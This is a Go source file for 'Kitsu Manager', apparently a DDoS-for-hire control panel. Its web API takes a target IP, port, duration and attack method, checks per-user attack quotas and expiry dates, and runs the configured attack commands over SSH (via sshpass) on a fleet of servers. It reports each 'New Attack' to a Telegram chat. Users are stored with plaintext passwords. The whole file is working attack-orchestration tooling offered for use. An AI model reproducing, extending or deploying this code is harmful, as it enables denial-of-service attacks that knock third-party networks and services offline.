package main

// ! Fully made by t.me/lilsheepyy

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

// TODO: Add api support
var (
	db  *sql.DB
	cfg Config
)

type PanelData struct {
	Users []User
}

type User struct {
	Username    string
	Password    string
	MaxDuration string
	Concurrents string
	Expire      string
	Powersaving string
}

type Config struct {
	GlobalMaxConcurrents int             `json:"globalMaxConcurrents"`
	SessionKey           string          `json:"sessionKey"`
	Database             DatabaseConfig  `json:"database"`
	Servers              []ServerConfig  `json:"servers"`
	Methods              []MethodConfig  `json:"methods"`
	TelegramBotToken     string          `json:"telegramBotToken"`
	TelegramChatID       int64           `json:"telegramChatID"`
	Blacklist            BlacklistConfig `json:"blacklist"`
}

type BlacklistConfig struct {
	IPs     []string `json:"ips"`
	Subnets []string `json:"subnets"`
	Ports   []int    `json:"ports"`
}

type DatabaseConfig struct {
	User     string `json:"user"`
	Password string `json:"password"`
	Host     string `json:"host"`
	Name     string `json:"name"`
}

type ServerConfig struct {
	Config struct {
		Host     string `json:"host"`
		Port     int    `json:"port"`
		Username string `json:"username"`
		Password string `json:"password"`
	} `json:"config"`
}

type MethodConfig struct {
	Name    string `json:"name"`
	Command string `json:"command"`
}

var bot *tgbotapi.BotAPI

func init() {

	// Load the config.json
	var err error
	file, err := os.ReadFile("assets/config.json")
	if err != nil {
		log.Fatalf("Error reading config file: %v", err)
	}
	err = json.Unmarshal(file, &cfg)
	if err != nil {
		log.Fatalf("Error parsing config file: %v", err)
	}

	// Initialize the database connection
	db, err = sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s",
		cfg.Database.User, cfg.Database.Password, cfg.Database.Host, cfg.Database.Name))
	if err != nil {
		log.Fatalf("Error connecting to database: %v", err)
	}
	log.Println("\033[35mConnected to the database\033[0m")

	// Initialize the Telegram bot
	bot, err = tgbotapi.NewBotAPI(cfg.TelegramBotToken)
	if err != nil {
		log.Fatalf("Error creating Telegram bot: %v", err)
	}
}

func main() {

	cyan := "\033[36m"
	reset := "\033[0m"
	magenta := "\033[35m"

	log.Println(cyan + "Kitsu Manager Started" + reset)
	log.Println(magenta + "Coded by t.me/lilsheepyy" + reset)
	http.HandleFunc("/api", handleAPI)
	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/credits", handleCredits)
	http.HandleFunc("/panel", handlePanel)
	http.HandleFunc("/login", handleLogin)
	log.Fatal(http.ListenAndServe(":80", nil))
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		http.ServeFile(w, r, "assets/login.html")
		return
	}

	if r.Method == http.MethodPost {
		key := r.FormValue("key")

		if key != cfg.SessionKey {
			http.Error(w, "Invalid key", http.StatusUnauthorized)
			return
		}

		// Cokie for login
		http.SetCookie(w, &http.Cookie{
			Name:  "session",
			Value: key,
			Path:  "/",
		})

		http.Redirect(w, r, "/panel", http.StatusSeeOther)
		return
	}

	http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
}

func handlePanel(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("session")
	if err != nil || cookie.Value != cfg.SessionKey {
		http.Redirect(w, r, "/login", http.StatusSeeOther)
		return
	}

	if r.Method == http.MethodGet {
		rows, err := db.Query("SELECT username, secret, maxduration, concurrents, expire, powersaving FROM users")
		if err != nil {
			http.Error(w, "Failed to retrieve users", http.StatusInternalServerError)
			return
		}
		defer rows.Close()

		var users []User
		for rows.Next() {
			var user User
			if err := rows.Scan(&user.Username, &user.Password, &user.MaxDuration, &user.Concurrents, &user.Expire, &user.Powersaving); err != nil {
				http.Error(w, "Failed to retrieve users", http.StatusInternalServerError)
				return
			}
			users = append(users, user)
		}

		data := PanelData{Users: users}

		tmpl, err := template.ParseFiles("assets/panel.html")
		if err != nil {
			http.Error(w, "Failed to load template", http.StatusInternalServerError)
			return
		}
		tmpl.Execute(w, data)
		return
	}

	if r.Method == http.MethodPost {
		if r.FormValue("action") == "add" {
			username := r.FormValue("username")
			password := r.FormValue("password")
			maxDuration := r.FormValue("maxduration")
			concurrents := r.FormValue("concurrents")
			expire := r.FormValue("expire")
			powersaving := r.FormValue("powersaving")

			if username == "" || password == "" || maxDuration == "" || concurrents == "" || expire == "" {
				http.Error(w, "All fields are required", http.StatusBadRequest)
				return
			}

			var existingUser string
			err := db.QueryRow("SELECT username FROM users WHERE username = ?", username).Scan(&existingUser)
			if err != nil && err != sql.ErrNoRows {
				http.Error(w, "Failed to check existing users", http.StatusInternalServerError)
				return
			}

			if existingUser != "" {
				http.Error(w, "User already exists", http.StatusConflict)
				return
			}

			_, err = db.Exec("INSERT INTO users (username, secret, maxduration, concurrents, expire, powersaving) VALUES (?, ?, ?, ?, ?, ?)",
				username, password, maxDuration, concurrents, expire, powersaving)
			if err != nil {
				log.Printf("Error adding user: %v", err)
				http.Error(w, "Failed to add user", http.StatusInternalServerError)
				return
			}

			http.Redirect(w, r, "/panel", http.StatusSeeOther)
			return
		} else if r.FormValue("action") == "delete" {
			username := r.FormValue("username")

			if username == "" {
				http.Error(w, "Username is required", http.StatusBadRequest)
				return
			}

			_, err := db.Exec("DELETE FROM users WHERE username = ?", username)
			if err != nil {
				http.Error(w, "Failed to delete user", http.StatusInternalServerError)
				return
			}

			http.Redirect(w, r, "/panel", http.StatusSeeOther)
			return
		}
	}
}

func handleCredits(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Made by t.me/lilsheepyy"))
}

func handleAPI(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	target := r.URL.Query().Get("target")
	port := r.URL.Query().Get("port")
	duration := r.URL.Query().Get("duration")
	method := r.URL.Query().Get("method")
	username := r.URL.Query().Get("username")
	key := r.URL.Query().Get("key")

	// Validate input incase someone tries to send bad characters!
	if BannedCharacters(target, port, duration, method, username, key) {
		http.Error(w, "Input contains banned characters", http.StatusBadRequest)
		return
	}

	if target == "" || port == "" || duration == "" || method == "" || username == "" || key == "" {
		http.Error(w, "Missing parameters", http.StatusBadRequest)
		return
	}

	portInt, err := strconv.Atoi(port)
	if err != nil {
		http.Error(w, "Invalid port", http.StatusBadRequest)
		return
	}

	durationInt, err := strconv.Atoi(duration)
	if err != nil {
		http.Error(w, "Invalid duration", http.StatusBadRequest)
		return
	}

	if !isValidUser(username, key) {
		http.Error(w, "Invalid username or key", http.StatusUnauthorized)
		return
	}

	if isIPBlacklisted(target, cfg.Blacklist.IPs, cfg.Blacklist.Subnets) {
		http.Error(w, "Target IP is blacklisted", http.StatusForbidden)
		return
	}

	if isPortBlacklisted(portInt, cfg.Blacklist.Ports) {
		http.Error(w, "Target port is blacklisted", http.StatusForbidden)
		return
	}

	if err := isUserAllowed(username, durationInt, target); err != nil {
		if err.Error() == "Maximum number of concurrent attacks for user exceeded" {
			http.Error(w, err.Error(), http.StatusForbidden)
		} else if err.Error() == "maximum global attacks reached" {
			http.Error(w, err.Error(), http.StatusForbidden)
		} else if err.Error() == "User has an active attack to this target in powersaving mode" {
			http.Error(w, err.Error(), http.StatusForbidden)
		} else {
			http.Error(w, err.Error(), http.StatusBadRequest)
		}
		return
	}

	logID, err := logRequest(username, target, portInt, durationInt, method)
	if err != nil {
		log.Printf("Failed to log request for user %s. Target: %s, Port: %d, Duration: %d, Method: %s. Error: %v",
			username, target, portInt, durationInt, method, err)
		http.Error(w, "Failed to log request", http.StatusInternalServerError)
		return
	}

	// Send notification to Telegram
	msg := fmt.Sprintf("New Attack:\nUser: %s\nTarget: %s\nPort: %d\nDuration: %d seconds\nMethod: %s",
		username, target, portInt, durationInt, method)
	telegramMsg := tgbotapi.NewMessage(cfg.TelegramChatID, msg)
	bot.Send(telegramMsg)

	w.WriteHeader(http.StatusOK)
	response := fmt.Sprintf("Attack started:\nTarget: %s\nPort: %d\nDuration: %d seconds\nMethod: %s", target, portInt, durationInt, method)
	w.Write([]byte(response))

	go func() {
		if err := executeCommands(target, portInt, durationInt, method, logID); err != nil {
			log.Printf("Failed to execute commands for logID %d. Error: %v", logID, err)
		}
		if err := updateEndTime(logID); err != nil {
			log.Printf("Failed to update end time for logID %d. Error: %v", logID, err)
		}
	}()
}

func BannedCharacters(values ...string) bool {
	bannedChars := []rune{';', ',', '$'}
	for _, value := range values {
		for _, char := range bannedChars {
			if strings.ContainsRune(value, char) {
				return true
			}
		}
	}
	return false
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "assets/index.html")
}

func isValidUser(username, key string) bool {
	// Yes the password is stored in plain, just don´t use path as host this and itll be fine!
	var storedPassword string
	err := db.QueryRow("SELECT secret FROM users WHERE username = ?", username).Scan(&storedPassword)
	if err != nil {
		log.Printf("Error querying user password: %v", err)
		return false
	}

	return storedPassword == key
}

func isUserAllowed(username string, duration int, target string) error {
	var maxDuration, concurrents, expireStr, powersaving string
	err := db.QueryRow("SELECT maxduration, concurrents, expire, powersaving FROM users WHERE username = ?", username).
		Scan(&maxDuration, &concurrents, &expireStr, &powersaving)
	if err != nil {
		log.Printf("Error querying user data: %v", err)
		return fmt.Errorf("internal error checking user permissions")
	}

	maxDurationInt, err := strconv.Atoi(maxDuration)
	if err != nil {
		log.Printf("Error converting maxDuration to int: %v", err)
		return fmt.Errorf("internal error checking user permissions")
	}

	concurrentsInt, err := strconv.Atoi(concurrents)
	if err != nil {
		log.Printf("Error converting concurrents to int: %v", err)
		return fmt.Errorf("internal error checking user permissions")
	}

	if duration > maxDurationInt {
		return fmt.Errorf("requested duration exceeds allowed limit")
	}

	expireDate, err := time.Parse("02-01-06", expireStr)
	if err != nil {
		log.Printf("Error parsing expire date: %v", err)
		return fmt.Errorf("internal error checking user permissions")
	}

	if time.Now().After(expireDate) {
		return fmt.Errorf("user account has expired")
	}

	var activeAttacks int
	err = db.QueryRow("SELECT COUNT(*) FROM logs WHERE username = ? AND end_time IS NULL", username).Scan(&activeAttacks)
	if err != nil {
		log.Printf("Error querying active attacks: %v", err)
		return fmt.Errorf("internal error checking user permissions")
	}

	if activeAttacks >= concurrentsInt {
		return fmt.Errorf("Maximum number of concurrent attacks for user exceeded")
	}

	var globalActiveAttacks int
	err = db.QueryRow("SELECT COUNT(*) FROM logs WHERE end_time IS NULL").Scan(&globalActiveAttacks)
	if err != nil {
		log.Printf("Error querying global active attacks: %v", err)
		return fmt.Errorf("internal error checking global attack limit")
	}

	if globalActiveAttacks >= cfg.GlobalMaxConcurrents {
		return fmt.Errorf("maximum global attacks reached")
	}

	// Powersaving check
	if powersaving == "true" {
		var activeAttackToTarget int
		err = db.QueryRow("SELECT COUNT(*) FROM logs WHERE username = ? AND host = ? AND end_time IS NULL", username, target).
			Scan(&activeAttackToTarget)
		if err != nil {
			log.Printf("Error querying active attacks to target: %v", err)
			return fmt.Errorf("internal error checking user permissions")
		}

		if activeAttackToTarget > 0 {
			return fmt.Errorf("User has an active attack to this target in powersaving mode")
		}
	}

	return nil
}

func isIPBlacklisted(target string, blacklistIPs []string, blacklistSubnets []string) bool {
	for _, ip := range blacklistIPs {
		if target == ip {
			return true
		}
	}

	for _, subnet := range blacklistSubnets {
		_, subnetNet, err := net.ParseCIDR(subnet)
		if err != nil {
			log.Printf("Error parsing CIDR subnet %s: %v", subnet, err)
			continue
		}

		if subnetNet.Contains(net.ParseIP(target)) {
			return true
		}
	}

	return false
}

func isPortBlacklisted(port int, blacklistPorts []int) bool {
	for _, blacklistedPort := range blacklistPorts {
		if port == blacklistedPort {
			return true
		}
	}
	return false
}

func logRequest(username, target string, port, duration int, method string) (int, error) {
	result, err := db.Exec("INSERT INTO logs (username, host, port, duration, method, time_sent) VALUES (?, ?, ?, ?, ?, ?)",
		username, target, port, duration, method, time.Now().Unix())
	if err != nil {
		return 0, err
	}

	lastInsertID, err := result.LastInsertId()
	if err != nil {
		return 0, err
	}

	return int(lastInsertID), nil
}

func executeCommands(target string, port, duration int, method string, logID int) error {
	var cmdTemplate string
	for _, methodCfg := range cfg.Methods {
		if methodCfg.Name == method {
			cmdTemplate = methodCfg.Command
			break
		}
	}
	if cmdTemplate == "" {
		return fmt.Errorf("method not found")
	}

	cmd := strings.ReplaceAll(cmdTemplate, "{IP}", target)
	cmd = strings.ReplaceAll(cmd, "{PORT}", strconv.Itoa(port))
	cmd = strings.ReplaceAll(cmd, "{DURATION}", strconv.Itoa(duration))

	for _, serverCfg := range cfg.Servers {
		server := serverCfg.Config

		// Construct the SSH command and arguments separately
		sshArgs := []string{
			"sshpass", "-p", server.Password,
			"ssh",
			"-o", "StrictHostKeyChecking=no",
			"-p", strconv.Itoa(server.Port),
			fmt.Sprintf("%s@%s", server.Username, server.Host),
			cmd,
		}
		// Bad idea this will print as many times as servers you got i gotta fix this someday, not important you got the db and the telegram log bot

		//fmt.Printf("Attack Sent: Target: %s Port: %d Duration: %d Method: %s\n", target, port, duration, method)
		// Execute the command
		execCmd := exec.Command(sshArgs[0], sshArgs[1:]...)
		output, err := execCmd.CombinedOutput()
		if err != nil {
			return fmt.Errorf("failed to execute command on server %s: %w. Output: %s", server.Host, err, string(output))
		}
	}

	time.Sleep(time.Duration(duration) * time.Second)

	return nil
}

func updateEndTime(logID int) error {
	_, err := db.Exec("UPDATE logs SET end_time = ? WHERE id = ?", time.Now().Unix(), logID)
	return err
}
